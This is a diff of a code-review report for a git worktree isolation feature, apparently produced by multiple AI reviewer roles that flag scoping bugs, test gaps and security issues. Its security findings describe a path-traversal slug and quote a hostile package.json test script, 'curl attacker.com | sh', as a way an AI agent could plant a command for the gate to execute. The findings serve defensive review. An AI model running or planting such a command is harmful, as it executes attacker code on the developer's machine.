@@ -1,88 +1,34 @@
-# Engineer Review: git-worktree-isolation — cwd injection into agent dispatches
+## Parallel Review Findings
 
-**Overall Verdict: FAIL**
+🔴 [engineer] `bin/lib/run.mjs:1025` — `let completed`, `let blocked`, `const startTime` declared inside `try {}` (opened line 950, closed line 1474 by `} finally {}`). JavaScript `let`/`const` are block-scoped — these throw `ReferenceError` at lines 1477, 1490, 1491, 1535 on every successful run of `_runSingleFeature`. The completion report, token summary, and `return "done"`/`"blocked"` are unreachable. Fix: hoist all three declarations to function scope before `try {` at line 950 (alongside `let worktreePath = null` at line 942).
+[simplicity] No 🔴 critical findings. Three 🟡 warnings:
+🟡 [architect] `bin/lib/gate.mjs:59` — `cmdGate` hardcodes `cwd: process.cwd()` while `runGateInline` now accepts an injected worktree path; add a doc comment (or align the API) explaining that `cmdGate` is not worktree-aware, so the divergence is visible to future maintainers before it causes a silent isolation failure.
+🟡 [engineer] `test/worktree.test.mjs:185` — `runGateInline` cwd test asserts `result.stdout.trim().includes(tmpDir.split("/").pop())` (last path segment only); basename collision or macOS symlink expansion gives a false positive. Use full-path equality.
+🟡 [engineer] `test/worktree.test.mjs` — No test verifies `_runSingleFeature` passes `worktreePath` into `runGateInline`. Dropping `cwd` at line 1149 passes the entire suite.
+🟡 [product] `test/worktree.test.mjs:186` — cwd assertion checks only `tmpDir.split("/").pop()` (last segment); two temp dirs with identical names produce a false positive — strengthen to full path equality
+🟡 [product] `test/worktree.test.mjs` — no test verifies the `_runSingleFeature → runGateInline` wiring; a one-line drop of `cwd` at `run.mjs:1149` would not be caught since `runGateInline` silently defaults to `process.cwd()`
+🟡 [tester] test/worktree.test.mjs:1 — No test verifies `_runSingleFeature` passes `worktreePath` as `cwd` to `runGateInline`; deleting the `cwd` arg from `run.mjs:1149` silently falls back to `process.cwd()` without failing any test — backlog a spy/mock test at the `_runSingleFeature` level
+🟡 [tester] test/worktree.test.mjs:186 — `result.stdout.trim().includes(tmpDir.split("/").pop())` checks only the last path segment; use full-path equality to eliminate false positives from identically-suffixed temp dirs
+[tester] Core claim verified by direct code trace: `runGateInline` at `run.mjs:52` accepts `cwd`, `execSync` at line 59 uses it, `_runSingleFeature` sets `cwd = worktreePath` at line 945, and passes it at line 1149. Three unit tests confirm it. Gate exited 0. The previously-critical `-b`→`-B` regression is confirmed fixed at `run.mjs:167` with tests covering it. Two 🟡 backlog items flagged — neither blocks this merge.
+🟡 [security] `bin/lib/run.mjs:161` — Path traversal: `slug` is used raw in `join(mainCwd, ".team", "worktrees", slug)`. `slugToBranch(slug)` sanitizes for the **branch name** (line 162) but its sanitized output is never applied to the **path**. `path.join` resolves `..` segments — `createWorktreeIfNeeded("../../evil", "/repo")` produces `worktreePath = /repo/evil`, escaping `.team/worktrees/`. Fix: after line 161 add a resolve+startsWith guard: `if (!worktreePath.startsWith(join(mainCwd, ".team", "worktrees"))) throw new Error("unsafe slug")`
+🟡 [security] `bin/lib/run.mjs:58` + `bin/lib/run.mjs:388–394` — Shell injection from AI-written worktree files: `detectGateCommand(cwd)` now reads from the **worktree** directory (since cwd = worktreePath after this change). It reads `package.json scripts.test` verbatim and passes it to `execSync(cmd, { shell: true })`. An AI agent that writes `"scripts": {"test": "curl attacker.com | sh"}` into the worktree's `package.json` before the gate runs achieves arbitrary code execution. This is a realistic prompt-injection path. Consider: (a) detecting the gate command from mainCwd rather than the worktree, or (b) allowlisting to known-safe commands.
+🔵 [security] `bin/lib/run.mjs:161–162` — Sanitization asymmetry is invisible: `slugToBranch` output looks like it protects both uses, but it only protects the branch name. The raw slug flows into the path silently. Add a comment or the bounds check (see 🟡 above) to make this contract explicit.
+🟡 [simplicity] `test/worktree.test.mjs:204` — `describe("slugToBranch normalization")` duplicates `describe("slugToBranch")` at line 14; both tests are fully covered there — delete them
+🟡 [simplicity] `bin/lib/run.mjs:942` — `cwd` variable reused for both main-repo and worktree directory across the same function scope; rename the reassignment (`cwd = worktreePath`) to a separate variable to make the semantic shift explicit
+🟡 [simplicity] `bin/lib/run.mjs:52` — `cwd = process.cwd()` default on the now-exported `runGateInline` is a silent footgun; any caller that forgets the 4th arg runs the gate against the wrong directory without warning — remove the default to require explicit passing
+🔵 [architect] `test/worktree.test.mjs:186` — cwd assertion checks only `tmpDir.split("/").pop()` (last path segment); on macOS symlinks (`/var` → `/private/var`) or accidental basename collisions this could yield a false positive; strengthen to full path equality or `fs.realpathSync`.
+🔵 [engineer] `bin/lib/run.mjs:325` — `dispatchToAgentAsync` cwd injection at line 335 has no dedicated unit test.
+🔵 [engineer] `test/worktree.test.mjs:204` — `describe("slugToBranch normalization")` duplicates the top-level `slugToBranch` suite and never calls `createWorktreeIfNeeded`. Rename or replace.
+🔵 [tester] bin/lib/run.mjs:52 — `cwd = process.cwd()` default is untested; add a test asserting that omitting the 4th arg produces `process.cwd()` behavior, documenting the fallback footgun
+🔵 [tester] test/worktree.test.mjs:204 — `describe("slugToBranch normalization")` never calls `createWorktreeIfNeeded`; both tests invoke `slugToBranch` directly, duplicating the suite at line 14 — rename or replace
+[simplicity] Two 🔵 suggestions:
+🔵 [simplicity] `test/worktree.test.mjs:186` — cwd assertion checks only last path segment (`split("/").pop()`); use full-path equality to eliminate false positives from identically-suffixed temp dirs
+🔵 [simplicity] `bin/lib/run.mjs:326` — `dispatchToAgentAsync` lacks `_spawnFn` injection unlike `dispatchToAgent`; parallel-review cwd injection path is untestable via mock
 
----
+🟡 compound-gate.mjs:0 — Thin review warning: fabricated-refs
 
-## Files Read
+## Compound Gate
 
-- `bin/lib/run.mjs` (lines 30–50, 145–175, 275–375, 739–750, 880–950, 1025–1180, 1460–1539)
-- `test/worktree.test.mjs` (all 236 lines)
-- `.team/features/git-worktree-isolation/tasks/task-1/handshake.json`
-- `.team/features/git-worktree-isolation/tasks/task-2/handshake.json`
-- git log (10 most recent commits)
-
----
-
-## Core Claim Verification
-
-**Claim:** `dispatchToAgent` / `dispatchToAgentAsync` forward `cwd: worktreePath` to `spawnSync` / `spawn`.
-
-| Check | Evidence | Result |
-|---|---|---|
-| `dispatchToAgent` signature | `export function dispatchToAgent(agent, brief, cwd, _spawnFn = spawnSync)` — line 279 | ✓ |
-| claude path spawnSync cwd | `_spawnFn("claude", [...], { ..., cwd, ... })` — line 284–290 | ✓ |
-| codex path spawnSync cwd | `_spawnFn("codex", [...], { ..., cwd, ... })` — line 307–312 | ✓ |
-| async dispatch spawn cwd | `spawn("claude", [...], { cwd, ... })` — line 333–337 | ✓ |
-| `_runSingleFeature` sets cwd | `cwd = worktreePath` at line 944; all dispatch calls (1035, 1115, 1172, 1360, 1410) use this `cwd` | ✓ |
-| Unit tests for cwd injection | `describe("dispatchToAgent cwd injection")` — lines 192–235: 3 mockSpawn tests | ✓ |
-| Gate | `npm test` exit 0 (handshake task-2) | ✓ |
-
-The core feature is correctly implemented and tested.
-
----
-
-## Criterion Results
-
-### 1. Correctness — FAIL
-
-🔴 `bin/lib/run.mjs:166` — `createWorktreeIfNeeded` uses `git worktree add -b feature/{slug}`. `removeWorktree` (via `git worktree remove --force`) deletes the directory but leaves the branch. Any second run (post-completion or post-pause resume) hits `existsSync(worktreePath) === false` at line 162, re-enters creation, and crashes: `"fatal: A branch named '...' already exists."` This breaks every re-run and every pause+resume. Fix: use `-B` instead of `-b`. This was a 🔴 critical in the task-1 review and is **still unaddressed**.
-
-Reproduction path:
-1. `removeWorktree` → `git worktree remove --force <path>` (line 173): directory gone, branch `feature/slug` persists
-2. Re-run → `existsSync(worktreePath) === false` (line 162): creation is triggered
-3. `git worktree add <path> -b feature/slug` (line 166): git rejects — branch exists
-
-### 2. Code Quality — PASS with warnings
-
-🟡 `test/worktree.test.mjs:65` — Test fixture hard-codes expected `-b` flag. When the `-b`→`-B` fix is applied, this assertion breaks. It currently documents the broken behavior and must be updated atomically with the fix.
-
-🟡 `bin/lib/run.mjs:155` — `slugToBranch` regex `[^a-z0-9\-\.]` strips uppercase without `.toLowerCase()` first: `"MyFeature"` → `"yeature"`. Current callers pre-normalize, so production is safe today, but the exported function is a trap for future callers. Prepend `.toLowerCase()` as first transform.
-
-🔵 `bin/lib/run.mjs:746` — `cwd` is reused for both the main repo path and the worktree path. A separate variable (`execCwd`) at line 944 would make the switch explicit and prevent accidental confusion.
-
-🔵 `test/worktree.test.mjs:176` — `describe("slugToBranch normalization")` never calls `createWorktreeIfNeeded`; both tests invoke `slugToBranch` directly and duplicate the `slugToBranch` suite at line 14. Misleadingly named — rename or replace with a real `createWorktreeIfNeeded` integration test.
-
-### 3. Error Handling — PASS
-
-- `try/finally` at lines 949–1474 guarantees `removeWorktree` runs on any exception, including `return "paused"` at line 1055 (JS `finally` runs on `return`). ✓
-- `createWorktreeIfNeeded` failure re-throws (lines 945–947), preventing agents from running against main. ✓
-- `removeWorktree` swallows its own errors (line 174) — correct for a cleanup path. ✓
-- Auto-commit (line 1155) uses `execFileSync` array args without `shell: true`. ✓
-
-### 4. Test Coverage — PASS with warnings
-
-🟡 `test/worktree.test.mjs` — No test verifies that `_runSingleFeature` wires `worktreePath` as `cwd` through to `dispatchToAgent`. The mock tests on `dispatchToAgent` directly are correct, but a one-line drop of `cwd` from the call site at line 1115 would pass the entire suite. Needs a spy/mock at the `_runSingleFeature` level.
-
-🔵 `test/worktree.test.mjs:158` — cwd assertion checks only `tmpDir.split("/").pop()` (last path segment). Strengthen to full path equality to eliminate false positives from identically-named temp dirs.
-
-🔵 `bin/lib/run.mjs:325` — `dispatchToAgentAsync` forwards `cwd` at line 334 but has no dedicated cwd-injection test. Covered only indirectly through `runParallelReviews`.
-
----
-
-## Actionable Backlog
-
-| Priority | Location | Action |
-|---|---|---|
-| **Must fix** | `bin/lib/run.mjs:166` | Change `-b` to `-B` in `git worktree add`; update `test/worktree.test.mjs:65` to expect `-B` |
-| Backlog | `test/worktree.test.mjs` | Add spy/mock test: `_runSingleFeature` passes `worktreePath` as `cwd` to `dispatchToAgent` |
-| Backlog | `bin/lib/run.mjs:155` | Prepend `.toLowerCase()` to `slugToBranch` transform chain |
-| Backlog | `test/worktree.test.mjs:158` | Strengthen cwd assertion to full path equality |
-
----
-
-## Summary
-
-The cwd injection feature is correctly implemented: `dispatchToAgent` and `dispatchToAgentAsync` both receive and forward the `cwd` parameter, `_runSingleFeature` sets `cwd = worktreePath` before all dispatch calls, and three unit tests verify injection via mockSpawn. The gate passes.
-
-The FAIL is for an unaddressed carry-over critical: `git worktree add -b` crashes on every second run of any feature. This was flagged 🔴 by the engineer role in the task-1 review, was not fixed in the `bba063a` "address all criticals" commit, and is not covered by any test.
+**Verdict:** WARN
+**Layers tripped:** 1/5
+**Tripped layers:** fabricated-refs
